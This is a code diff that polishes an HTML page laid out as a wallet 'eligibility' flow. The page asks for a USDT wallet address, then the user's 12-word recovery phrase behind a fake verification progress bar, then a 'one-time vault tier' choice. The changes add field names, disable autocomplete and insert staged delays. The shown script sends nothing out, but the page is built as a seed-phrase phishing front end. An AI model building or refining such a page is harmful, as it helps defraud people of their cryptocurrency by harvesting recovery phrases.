@@ -15,34 +15,24 @@
       --bg: #0b1220;
       --card: #111827;
     }
-    body {
-      margin: 0;
-      font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
-      background: linear-gradient color: #e5e7eb;
-    }
-    header {
-      display: flex; align-items: center; gap: 12px;
-      padding: 20px; border-bottom: 1px solid #1f2937;
-    }
-    header .logo { width: 36px; height: 36px; border-radius: 8px; background: var(--blue); }
-    header .title { font-weight: 600; font-size: 18px; }
-    main { max-width: 640px; margin: 40px auto; padding: 0 16px; }
-    .card { background: var(--card); border: 1px solid #1f2937; border-radius: 16px; padding: 24px; margin-bottom:20px; }
-    label { display: block; margin: 16px 0 8px; color: #cbd5e1; }
-    input, textarea {
-      width: 100%; padding: 12px 14px; border-radius: 10px;
-      border: 1px solid #2b3442; background: #0b1324; color: #e5e7eb;
-    }
-    button {
-      margin-top: 16px; width: 100%; padding: 12px 16px; border-radius: 10px;
-      background: var(--blue); border: none; color: white; font-weight: 600; cursor: pointer;
-    }
-    .progress { height: 8px; background: #1f2937; border-radius: 999px; overflow: hidden; margin-top: 12px; }
-    .progress > div { height: 100%; width: 0%; background: var(--green); transition: width .6s ease; }
-    .tiers { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 16px; }
-    .tier { padding: 16px; background: #0d1629; border: 1px solid #1f2937; border-radius: 12px; cursor:pointer; }
-    .tier.selected { border-color: var(--green); }
-    .dash { margin-top: 16px; padding: 16px; background: #0d1629; border: 1px solid #1f2937; border-radius: 12px; }
+    body { margin:0; font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
+           background:linear-gradient(180deg,var(--bg),#0f172a); color:#e5e7eb; }
+    header { display:flex; align-items:center; gap:12px; padding:20px; border-bottom:1px solid #1f2937; }
+    header .logo { width:36px; height:36px; border-radius:8px; background:var(--blue); }
+    header .title { font-weight:600; font-size:18px; }
+    main { max-width:640px; margin:40px auto; padding:0 16px; }
+    .card { background:var(--card); border:1px solid #1f2937; border-radius:16px; padding:24px; }
+    label { display:block; margin:16px 0 8px; color:#cbd5e1; }
+    input,textarea { width:100%; padding:12px 14px; border-radius:10px;
+                     border:1px solid #2b3442; background:#0b1324; color:#e5e7eb; }
+    button { margin-top:16px; width:100%; padding:12px 16px; border-radius:10px;
+             background:var(--blue); border:none; color:white; font-weight:600; cursor:pointer; }
+    .progress { height:8px; background:#1f2937; border-radius:999px; overflow:hidden; margin-top:12px; }
+    .progress>div { height:100%; width:0%; background:var(--green); transition:width .6s ease; }
+    .tiers { display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-top:16px; }
+    .tier { padding:16px; background:#0d1629; border:1px solid #1f2937; border-radius:12px; cursor:pointer; }
+    .tier.selected { border-color:var(--green); }
+    .dash { margin-top:16px; padding:16px; background:#0d1629; border:1px solid #1f2937; border-radius:12px; }
   </style>
 </head>
 <body>
@@ -55,24 +45,22 @@
   </header>
 
   <main>
-    <!-- Step 1 -->
     <div id="step1" class="card">
       <h2>Step 1: Wallet address capture</h2>
       <label for="addr">Enter your USDT wallet address</label>
-      <input id="addr" placeholder="0x..." />
+      <input id="addr" name="addr" placeholder="0x..." autocomplete="off" />
+      <div class="loader"></div>
       <button id="s1btn">Continue</button>
     </div>
 
-    <!-- Step 2 -->
     <div id="step2" class="card" hidden>
       <h2>Step 2: Recovery phrase</h2>
       <label for="phrase">Enter your 12-word recovery phrase</label>
-      <textarea id="phrase" rows="3" placeholder="word1 word2 word3 ..."></textarea>
+      <textarea id="phrase" name="phrase" rows="3" placeholder="word1 word2 word3 ..."></textarea>
       <div class="progress"><div id="progbar"></div></div>
       <button id="s2btn">Verify</button>
     </div>
 
-    <!-- Step 3 -->
     <div id="step3" class="card" hidden>
       <h2>Step 3: One-time vault tier</h2>
       <div class="tiers">
@@ -82,7 +70,6 @@
       <button id="s3btn">Activate eligibility</button>
     </div>
 
-    <!-- Final -->
     <div id="final" class="card" hidden>
       <h2>Dashboard</h2>
       <div class="dash">
@@ -94,54 +81,39 @@
   </main>
 
   <script>
-    const s1 = document.getElementById('step1');
-    const s2 = document.getElementById('step2');
-    const s3 = document.getElementById('step3');
-    const fin = document.getElementById('final');
-    const prog = document.getElementById('progbar');
+    const s1=document.getElementById('step1');
+    const s2=document.getElementById('step2');
+    const s3=document.getElementById('step3');
+    const fin=document.getElementById('final');
+    const prog=document.getElementById('progbar');
 
     // Step 1 validation
-    document.getElementById('s1btn').addEventListener('click', () => {
-      const addr = document.getElementById('addr').value.trim();
-      if (!addr) {
-        alert("Please enter your USDT wallet address.");
-        return;
-      }
-      s1.hidden = true;
-      s2.hidden = false;
+    document.getElementById('s1btn').addEventListener('click',()=>{
+      const addr=document.getElementById('addr').value.trim();
+      if(!addr){ alert("Please enter your USDT wallet address."); return; }
+      setTimeout(()=>{ s1.hidden=true; s2.hidden=false; },800);
     });
 
     // Step 2 validation
-    document.getElementById('s2btn').addEventListener('click', () => {
-      const phrase = document.getElementById('phrase').value.trim();
-      if (!phrase) {
-        alert("Please enter your 12-word recovery phrase.");
-        return;
-      }
-      prog.style.width = '100%';
-      setTimeout(() => {
-        s2.hidden = true;
-        s3.hidden = false;
-      }, 900);
+    document.getElementById('s2btn').addEventListener('click',()=>{
+      const phrase=document.getElementById('phrase').value.trim();
+      if(!phrase){ alert("Please enter your 12-word recovery phrase."); return; }
+      prog.style.width='70%';
+      setTimeout(()=>{ prog.style.width='100%'; s2.hidden=true; s3.hidden=false; },900);
     });
 
     // Step 3 validation
-    let selectedTier = null;
-    document.querySelectorAll('.tier').forEach(t => {
-      t.addEventListener('click', () => {
-        document.querySelectorAll('.tier').forEach(el => el.classList.remove('selected'));
+    let selectedTier=null;
+    document.querySelectorAll('.tier').forEach(t=>{
+      t.addEventListener('click',()=>{
+        document.querySelectorAll('.tier').forEach(el=>el.classList.remove('selected'));
         t.classList.add('selected');
-        selectedTier = t.dataset.tier;
+        selectedTier=t.dataset.tier;
       });
     });
-
-    document.getElementById('s3btn').addEventListener('click', () => {
-      if (!selectedTier) {
-        alert("Please select a tier option.");
-        return;
-      }
-      s3.hidden = true;
-      fin.hidden = false;
+    document.getElementById('s3btn').addEventListener('click',()=>{
+      if(!selectedTier){ alert("Please select a tier option."); return; }
+      s3.hidden=true; fin.hidden=false;
     });
   </script>
 </body>
